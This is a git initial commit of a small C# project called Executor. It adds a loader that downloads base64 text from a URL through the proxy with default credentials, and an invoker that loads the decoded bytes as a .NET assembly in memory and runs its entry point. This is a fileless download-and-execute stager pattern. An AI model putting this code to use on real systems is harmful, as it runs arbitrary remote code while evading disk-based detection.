c8463b7f4b9b4f2ff4095282be719ef22b578932
Filip Ceglik <fceglik@gmail.com>
2021-12-29 21:38:21 +0100

    Initial commit

---
+++ Executor/Invoker.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Executor
+{
+    internal class Invoker
+    {
+        public static Assembly Invoke(byte[] bin)
+        {
+            var asm = Assembly.Load(bin);
+            return asm;
+        }
+
+        public static void Run(Assembly assembly, string[] param)
+        {
+            assembly.EntryPoint.Invoke(null, new object[] { param });
+        }
+    }
+}
---
+++ Executor/Loader.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Executor
+{
+    internal class Loader
+    {
+        public static byte[] LoadURL(string url)
+        {
+            System.Net.IWebProxy defaultWebProxy = System.Net.WebRequest.DefaultWebProxy;
+            defaultWebProxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
+            return Convert.FromBase64String((new System.Net.WebClient() { Proxy = defaultWebProxy }).DownloadString(url));
+        }
+    }
+}
